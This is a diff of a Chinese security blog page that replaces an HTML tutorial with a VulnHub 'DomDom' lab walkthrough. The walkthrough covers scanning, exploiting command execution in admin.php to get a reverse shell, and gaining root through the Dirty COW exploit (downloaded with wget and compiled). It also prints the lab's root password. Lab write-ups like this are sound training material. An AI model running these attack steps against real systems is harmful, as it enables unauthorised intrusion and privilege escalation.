@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="WEB安全HTML基础, Cx330 计算机 网络安全 渗透测试">
+    <meta name="keywords" content="vulnhub靶场DomDom, Cx330 计算机 网络安全 渗透测试">
     <meta name="description" content="专科 | 电子信息工程 | 网络安全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>WEB安全HTML基础 | Cx330</title>
+    <title>vulnhub靶场DomDom | Cx330</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -355,12 +355,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://s1.ax1x.com/2022/08/13/vtnVTf.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdnjson.com/images/2022/11/16/bg.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">WEB安全HTML基础</h1>
+                    <h1 class="description center-align post-title">vulnhub靶场DomDom</h1>
                 </div>
             </div>
         </div>
@@ -479,12 +479,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/HTML/">
-                                <span class="chip bg-color">HTML</span>
-                            </a>
-                        
                             <a href="/tags/Web-Security/">
                                 <span class="chip bg-color">Web Security</span>
+                            </a>
+                        
+                            <a href="/tags/vulnhub/">
+                                <span class="chip bg-color">vulnhub</span>
                             </a>
                         
                     </div>
@@ -495,8 +495,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" class="post-category">
-                                编程语言
+                            <a href="/categories/vulnhub/" class="post-category">
+                                vulnhub
                             </a>
                         
                     </div>
@@ -508,28 +508,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-08-08
+                    2022-11-16
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-08-16
+                    2022-11-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    358
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    1 分
                 </div>
                 
 
@@ -549,178 +549,57 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="0x001-HTML简介"><a href="#0x001-HTML简介" class="headerlink" title="0x001 HTML简介"></a>0x001 HTML简介</h3><hr>
-<p>什么是HTML?</p>
-<ul>
-<li><code>HTML</code> 是用来描述网页的一种语言。</li>
-<li><code>HTML</code> 指的是超文本标记语言: <code>HyperText Markup Language</code></li>
-<li><code>HTML</code> 不是一种编程语言，而是一种标记语言</li>
-<li>标记语言是一套标记标签 (<code>markup tag</code>)</li>
-<li><code>HTML</code> 使用标记标签来描述网页</li>
-<li><code>HTML</code> 文档包含了<code>HTML</code> 标签及文本内容</li>
-<li><code>HTML</code>文档也叫做 <code>web</code> 页面</li>
-</ul>
+                <h3 id="0x000-靶场描述"><a href="#0x000-靶场描述" class="headerlink" title="0x000 靶场描述"></a>0x000 靶场描述</h3><hr>
+<p>你对PHP程序的理解程度如何？您对 Linux 错误配置有多熟悉？此图像将涵盖高级 Web 攻击、开箱即用的思维和最新的安全漏洞。</p>
+<p>此靶场没有flag，获取到root权限即可。。。</p>
 <hr>
-<h3 id="0x002-HTML页面架构"><a href="#0x002-HTML页面架构" class="headerlink" title="0x002 HTML页面架构"></a>0x002 HTML页面架构</h3><hr>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span>
-<span class="token operator">&lt;</span>html<span class="token operator">></span>
-    <span class="token operator">&lt;</span>head<span class="token operator">></span>
-        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>
-        <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token operator">&lt;</span>/title<span class="token operator">></span>
-    <span class="token operator">&lt;</span>/head<span class="token operator">></span>
-    <span class="token operator">&lt;</span>body<span class="token operator">></span>
-    <span class="token operator">&lt;</span>/body<span class="token operator">></span>
-<span class="token operator">&lt;</span>/html<span class="token operator">></span>
-</code></pre>
-<p><code>charset</code>常用编码：<code>gbk</code>、<code>gbk2312</code>、<code>utf-8</code></p>
+<h3 id="0x001-靶场下载"><a href="#0x001-靶场下载" class="headerlink" title="0x001 靶场下载"></a>0x001 靶场下载</h3><hr>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/domdom-1,328/">https://www.vulnhub.com/entry/domdom-1,328/</a></p>
 <hr>
-<h3 id="0x003-HTML常见标签"><a href="#0x003-HTML常见标签" class="headerlink" title="0x003 HTML常见标签"></a>0x003 HTML常见标签</h3><hr>
-<h4 id="1-meta标签"><a href="#1-meta标签" class="headerlink" title="1.meta标签"></a>1.meta标签</h4><p><code>&lt;meta&gt;</code> 元素可提供有关页面的元信息（<code>meta-information</code>），比如针对搜索引擎和更新频度的描述和关键词。<br>设置网站关键字</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"keywords"</span> content<span class="token operator">=</span><span class="token string">"网络安全，WEB 渗透"</span>/<span class="token operator">></span>
-</code></pre>
-<p><code>&lt;link&gt;</code> 标签定义文档与外部资源的关系。<br><code>&lt;script&gt;</code> 引入 <code>js</code> 文件</p>
-<p>注释</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>--这是一段注释。注释不会在浏览器中显示。--<span class="token operator">></span>
-<span class="token operator">&lt;</span>p<span class="token operator">></span>这是一段普通的段落。<span class="token operator">&lt;</span>/p<span class="token operator">></span>
-</code></pre>
-<h4 id="2-标题标签"><a href="#2-标题标签" class="headerlink" title="2.标题标签"></a>2.标题标签</h4><p>由大到小</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>h1<span class="token operator">></span>h1<span class="token operator">&lt;</span>/h1<span class="token operator">></span>
-<span class="token operator">&lt;</span>h2<span class="token operator">></span>h2<span class="token operator">&lt;</span>/h2<span class="token operator">></span>
-<span class="token operator">&lt;</span>h3<span class="token operator">></span>h3<span class="token operator">&lt;</span>/h3<span class="token operator">></span>
-<span class="token operator">&lt;</span>h4<span class="token operator">></span>h4<span class="token operator">&lt;</span>/h4<span class="token operator">></span>
-<span class="token operator">&lt;</span>h5<span class="token operator">></span>h5<span class="token operator">&lt;</span>/h5<span class="token operator">></span>
-<span class="token operator">&lt;</span>h6<span class="token operator">></span>h6<span class="token operator">&lt;</span>/h6<span class="token operator">></span>
-</code></pre>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>/br<span class="token operator">></span> 换行标签
-<span class="token operator">&lt;</span>hr<span class="token operator">></span> 换行线标签
-</code></pre>
-<h4 id="3-文本属性"><a href="#3-文本属性" class="headerlink" title="3.文本属性"></a>3.文本属性</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>strong<span class="token operator">></span>加粗<span class="token operator">&lt;</span>/strong<span class="token operator">></span>
-<span class="token operator">&lt;</span>b<span class="token operator">></span><span class="token operator">&lt;</span>/b<span class="token operator">></span> 加粗
-<span class="token operator">&lt;</span>i<span class="token operator">></span><span class="token operator">&lt;</span>/i<span class="token operator">></span> 斜体
-<span class="token operator">&lt;</span>u<span class="token operator">></span><span class="token operator">&lt;</span>/u<span class="token operator">></span> 下划线
-<span class="token operator">&lt;</span>sup<span class="token operator">></span><span class="token operator">&lt;</span>/sup<span class="token operator">></span> 上标
-<span class="token operator">&lt;</span>sub<span class="token operator">></span><span class="token operator">&lt;</span>/sub<span class="token operator">></span> 下标
-<span class="token operator">&lt;</span>del<span class="token operator">></span><span class="token operator">&lt;</span>/del<span class="token operator">></span> 删除线
-<span class="token operator">&lt;</span>pre<span class="token operator">></span><span class="token operator">&lt;</span>/pre<span class="token operator">></span> 代码样式原样输出
-<span class="token operator">&lt;</span>font<span class="token operator">></span><span class="token operator">&lt;</span>/font<span class="token operator">></span> 规定字体属性
-size 字体的大小
-color 字体颜色
-</code></pre>
-<h4 id="4-form表单"><a href="#4-form表单" class="headerlink" title="4.form表单"></a>4.form表单</h4><p><code>form</code> 表单：规定当提交表单时向何处发送表单数据</p>
-<p><code>method</code> 提交的方法有：<code>get</code>、<code>post</code></p>
-<p>规定在发送表单数据之前对其进行编码。</p>
-<p><code>enctype</code> 属性可能的值：</p>
-<pre class=" language-bash"><code class="language-bash">application/x-www-form-urlencoded
-multipart/form-data
-text/plain
-</code></pre>
-<p><code>input</code>标签</p>
-<ul>
-<li>name：同样是表示的该文本输入框名称。</li>
-<li>size：输入框的长度大小。</li>
-<li>maxlength：输入框中允许输入字符的最大数。</li>
-<li>value：输入框中的默认值</li>
-<li>readonly：表示该框中只能显示，不能添加修改。</li>
-</ul>
-<p><code>input</code>类型</p>
-<ul>
-<li>type=password 密码输入框</li>
-<li>type=file 文件上传</li>
-<li>type=hidden 隐藏域</li>
-<li>button 按钮</li>
-<li>checkbox 复选框</li>
-<li>radio 单选框</li>
-<li>type=submit 提交按钮</li>
-<li>type=reset 重置按钮</li>
-</ul>
-<h4 id="5-a-标签、img-标签、table-标签"><a href="#5-a-标签、img-标签、table-标签" class="headerlink" title="5.a 标签、img 标签、table 标签"></a>5.a 标签、img 标签、table 标签</h4><p>a 标签的作用：就是用于控制界面与页面之间的跳转，默认就是 self</p>
-<ul>
-<li>self：用于在当前选项卡中跳转，也就是不新建页面跳转</li>
-<li>_blank ：用于在新的选项卡中跳转，也就是新建页面跳转</li>
-</ul>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.baidu.com"</span> target<span class="token operator">=</span><span class="token string">"self"</span><span class="token operator">></span>百度<span class="token operator">&lt;</span>/a<span class="token operator">></span>
-<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.baidu.com"</span> target<span class="token operator">=</span><span class="token string">"_blank"</span><span class="token operator">></span>百度<span class="token operator">&lt;</span>/a<span class="token operator">></span>
-</code></pre>
-<ul>
-<li>_blank 在新窗口中打开被链接文档。</li>
-<li>_self 默认。在相同的框架中打开被链接文档。</li>
-<li>_parent 在父框架集中打开被链接文档。</li>
-<li>_top 在整个窗口中打开被链接文档。</li>
-</ul>
-<h4 id="6-锚文本"><a href="#6-锚文本" class="headerlink" title="6.锚文本"></a>6.锚文本</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"#2"</span><span class="token operator">></span>锚点<span class="token operator">&lt;</span>/a<span class="token operator">></span>
-<span class="token operator">&lt;</span>a name<span class="token operator">=</span><span class="token string">"2"</span><span class="token operator">></span>锚点<span class="token operator">&lt;</span>/a<span class="token operator">></span>
-</code></pre>
-<h4 id="7-img-标签"><a href="#7-img-标签" class="headerlink" title="7.img 标签"></a>7.img 标签</h4><ul>
-<li>img 元素向网页中嵌入一幅图像。</li>
-</ul>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"/image/cat.jpg"</span> alt<span class="token operator">=</span><span class="token string">"俺是猫"</span> /<span class="token operator">></span>
-</code></pre>
-<ul>
-<li>alt 规定图像的替代文本。</li>
-<li>src 规定显示图像的 url</li>
-<li>width 规定图片的高度</li>
-<li>height 规定图片的宽度</li>
-</ul>
-<h4 id="8-table-表单"><a href="#8-table-表单" class="headerlink" title="8.table 表单"></a>8.table 表单</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>caption<span class="token operator">></span>我的标题<span class="token operator">&lt;</span>/caption<span class="token operator">></span>表格带标题
-</code></pre>
-<ul>
-<li>border 边框</li>
-<li>width 宽度</li>
-<li>height 高度</li>
-<li>colspan 行</li>
-<li>rowspan 竖</li>
-</ul>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>th<span class="token operator">></span><span class="token operator">&lt;</span>/th<span class="token operator">></span>
-<span class="token operator">&lt;</span>tr<span class="token operator">></span>行<span class="token operator">&lt;</span>/tr<span class="token operator">></span>
-<span class="token operator">&lt;</span>td<span class="token operator">></span>表格<span class="token operator">&lt;</span>/td<span class="token operator">></span>
-</code></pre>
-<ul>
-<li>cellpadding 单元边与内容的空白</li>
-<li>cellspacing 单元格的空白</li>
-</ul>
-<h4 id="9-列表标签"><a href="#9-列表标签" class="headerlink" title="9.列表标签"></a>9.列表标签</h4><p><strong>无序列表</strong><br>项目符号 <code>square</code> <code>circle</code> <code>disc</code></p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>ul<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-<span class="token operator">&lt;</span>/ul<span class="token operator">></span>
-</code></pre>
-<p><strong>有序列表</strong></p>
-<ul>
-<li>数字列表 默认 数字</li>
-<li>小写字母列表</li>
-<li>大写字母列表 A</li>
-<li>罗马字母列表 I</li>
-<li>小写罗马字母列表 i</li>
-</ul>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>ol type<span class="token operator">=</span><span class="token string">"1"</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">!</span>--有序列表--<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-<span class="token operator">&lt;</span>/ol<span class="token operator">></span>
-</code></pre>
-<h4 id="10-框架的使用"><a href="#10-框架的使用" class="headerlink" title="10.框架的使用"></a>10.框架的使用</h4><p><code>iframe</code>语法:</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"URL"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span>
-</code></pre>
-<p>该<code>URL</code>指向不同的网页。</p>
-<p><code>ifram</code>e - 设置高度与宽度</p>
-<p><code>height</code> 和 <code>width</code> 属性用来定义<code>iframe</code>标签的高度与宽度。</p>
-<p>属性默认以像素为单位, 但是你可以指定其按比例显示 (如：”80%”)。</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iframe loading<span class="token operator">=</span><span class="token string">"lazy"</span> src<span class="token operator">=</span><span class="token string">"demo_iframe.htm"</span> width<span class="token operator">=</span><span class="token string">"200"</span> height<span class="token operator">=</span><span class="token string">"200"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span>
-</code></pre>
-<p><code>iframe</code> - 移除边框</p>
-<p><code>frameborder</code> 属性用于定义<code>iframe</code>表示是否显示边框。</p>
-<p>设置属性值为 “0” 移除<code>iframe</code>的边框:</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"demo_iframe.htm"</span> frameborder<span class="token operator">=</span><span class="token string">"0"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span>
-</code></pre>
-<p>使用 <code>iframe</code> 来显示目标链接页面<br><code>iframe</code> 可以显示一个目标链接的页面</p>
-<p>目标链接的属性必须使用 <code>iframe</code> 的属性，如下实例:</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"demo_iframe.htm"</span> name<span class="token operator">=</span><span class="token string">"iframe_a"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span>
-<span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"https://www.runoob.com"</span> target<span class="token operator">=</span><span class="token string">"iframe_a"</span> rel<span class="token operator">=</span><span class="token string">"noopener"</span><span class="token operator">></span>RUNOOB.COM<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
-</code></pre>
+<h3 id="0x002-信息收集"><a href="#0x002-信息收集" class="headerlink" title="0x002 信息收集"></a>0x002 信息收集</h3><hr>
+<h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><p><code>netdiscover -r 192.168.1.0/24</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/16/143e6c67d2aa43da7.png" alt="探测存活主机"></p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sS -sV -A -p 1-65535 192.168.1.106</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/16/2f2eb39d751aa4b4d.png" alt="端口扫描"></p>
+<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirsearch -u http://192.168.1.106/</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/16/3ad02431eef49650d.png" alt="目录扫描"></p>
 <hr>
-<h3 id="0x004-更多详细教程"><a href="#0x004-更多详细教程" class="headerlink" title="0x004 更多详细教程"></a>0x004 更多详细教程</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/html/html-tutorial.html">HTML教程</a></p>
+<h3 id="0x003-命令执行漏洞"><a href="#0x003-命令执行漏洞" class="headerlink" title="0x003 命令执行漏洞"></a>0x003 命令执行漏洞</h3><hr>
+<p>访问网站</p>
+<p><img src="https://cdnjson.com/images/2022/11/16/42a8f178334931af5.png" alt="index.php"></p>
+<p><img src="https://cdnjson.com/images/2022/11/16/50facb38fb3fcc13d.png" alt="admin.php"></p>
+<p>使用burpsuite抓包测试，发现admin.php存在命令执行漏洞；因此可以执行一个反弹shell从而getshell</p>
+<p><img src="https://cdnjson.com/images/2022/11/16/6f5197b65b2507978.png" alt="index.php"></p>
+<p><img src="https://cdnjson.com/images/2022/11/16/7316d820ef88b46e2.png" alt="admin.php"></p>
+<p><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a> 网站生成反弹shell</p>
+<p><img src="https://cdnjson.com/images/2022/11/16/8db8fbad4169f24c0.png" alt="php_shell"></p>
+<p>成功获取到shell</p>
+<p><img src="https://cdnjson.com/images/2022/11/16/9721feaae6743b7a5.png" alt="shell"></p>
+<p>切换交互模式：<code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> </p>
+<hr>
+<h3 id="0x004-提权"><a href="#0x004-提权" class="headerlink" title="0x004 提权"></a>0x004 提权</h3><hr>
+<h4 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h4><p>uname -a 查看当前系统版本为 Linux ubuntu 4.4.0-21-generic</p>
+<p>可以下载漏洞检测脚本进行检测 <a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
+<p>检测到CVE-2016-5195，典型的脏牛提权漏洞</p>
+<p><img src="https://cdnjson.com/images/2022/11/16/1047886455b0a4f920.png" alt="CVE-2016-5195"></p>
+<p>下载利用exp：<code>wget https://www.exploit-db.com/download/40616</code></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">mv</span> 40616 exp.c
+gcc exp.c -o exp -pthread
+<span class="token function">chmod</span> +x exp
+</code></pre>
+<blockquote>
+<p>这里编译的时候可能会报错，不用管</p>
+</blockquote>
+<p><img src="https://cdnjson.com/images/2022/11/16/1181836ec9e9664771.png" alt="root"></p>
+<h4 id="root密码登陆提权"><a href="#root密码登陆提权" class="headerlink" title="root密码登陆提权"></a>root密码登陆提权</h4><p>查找特殊权限的文件：<code>getcap -r / 2&gt;/dev/null</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/16/128f7671c0e50cb324.png" alt="getcap"></p>
+<p>打包用户 domom 目录</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">tar</span> -cvf domom.tar /home/domom
+<span class="token function">tar</span> -xvf domom.tar
+<span class="token function">cat</span> README.md
+</code></pre>
+<p>找到了root密码：<code>Mj7AGmPR-m&amp;Vf&gt;Ry{}LJRBS5nc+*V.#a</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/16/13f91a89e577cb232e.png" alt="root"></p>
 
                 
             </div>
@@ -747,7 +626,7 @@ text/plain
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Cx330Lm.github.io/2022/08/08/toc-heading-2/">http://Cx330Lm.github.io/2022/08/08/toc-heading-2/</a>
+                    <a href="http://Cx330Lm.github.io/2022/11/16/toc-heading-16/">http://Cx330Lm.github.io/2022/11/16/toc-heading-16/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -785,12 +664,12 @@ text/plain
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/HTML/">
-                                    <span class="chip bg-color">HTML</span>
-                                </a>
-                            
                                 <a href="/tags/Web-Security/">
                                     <span class="chip bg-color">Web Security</span>
+                                </a>
+                            
+                                <a href="/tags/vulnhub/">
+                                    <span class="chip bg-color">vulnhub</span>
                                 </a>
                             
                         </div>
@@ -1097,40 +976,42 @@ text/plain
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/08/08/toc-heading-3/">
+                <a href="/2022/11/16/toc-heading-16/">
                     <div class="card-image">
                         
-                        <img src="https://s1.ax1x.com/2022/08/13/vtucbq.jpg" class="responsive-img" alt="WEB安全MySQL基础">
+                        <img src="https://cdnjson.com/images/2022/11/16/bg.png" class="responsive-img" alt="vulnhub靶场DomDom">
                         
-                        <span class="card-title">WEB安全MySQL基础</span>
+                        <span class="card-title">vulnhub靶场DomDom</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。
+                            
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-08-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-category">
-                                    数据库
+                            <a href="/categories/vulnhub/" class="post-category">
+                                    vulnhub
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1138,8 +1019,8 @@ text/plain
                         <span class="chip bg-color">Web Security</span>
                     </a>
                     
-                    <a href="/tags/MySQL/">
-                        <span class="chip bg-color">MySQL</span>
+                    <a href="/tags/vulnhub/">
+                        <span class="chip bg-color">vulnhub</span>
                     </a>
                     
                 </div>
@@ -1153,30 +1034,30 @@ text/plain
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/08/08/toc-heading-1/">
+                <a href="/2022/11/15/toc-heading-15/">
                     <div class="card-image">
                         
-                        <img src="https://s1.ax1x.com/2022/08/13/vtKnMj.png" class="responsive-img" alt="hexo+github博客搭建">
+                        <img src="https://cdnjson.com/images/2022/11/16/27.png" class="responsive-img" alt="vulnhub靶场Trollcave">
                         
-                        <span class="card-title">hexo+github博客搭建</span>
+                        <span class="card-title">vulnhub靶场Trollcave</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            在经历前前后后多次失败之后，终于搭建出了属于自己的博客，目前博客的大致功能已经齐全；本博客基于Hexo框架，采用hexo-theme-matery主题，在这里非常感谢作者洪卫的hexo-blog-fly博客开源，极大简化了构建博客的工作量和复杂度。在此开源博客的基础上做了改进，修复了一些bug，顺利搭建完成了我的个人博客。大家对此主题有兴趣的可以下载源代码，搭建属于自己的个性化博客。
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-15
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/MyBlog/" class="post-category">
-                                    MyBlog
+                            <a href="/categories/vulnhub/" class="post-category">
+                                    vulnhub
                                 </a>
                             
                             
@@ -1186,16 +1067,12 @@ text/plain
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/hexo/">
-                        <span class="chip bg-color">hexo</span>
+                    <a href="/tags/Web-Security/">
+                        <span class="chip bg-color">Web Security</span>
                     </a>
                     
-                    <a href="/tags/github/">
-                        <span class="chip bg-color">github</span>
-                    </a>
-                    
-                    <a href="/tags/MyBlog/">
-                        <span class="chip bg-color">MyBlog</span>
+                    <a href="/tags/vulnhub/">
+                        <span class="chip bg-color">vulnhub</span>
                     </a>
                     
                 </div>
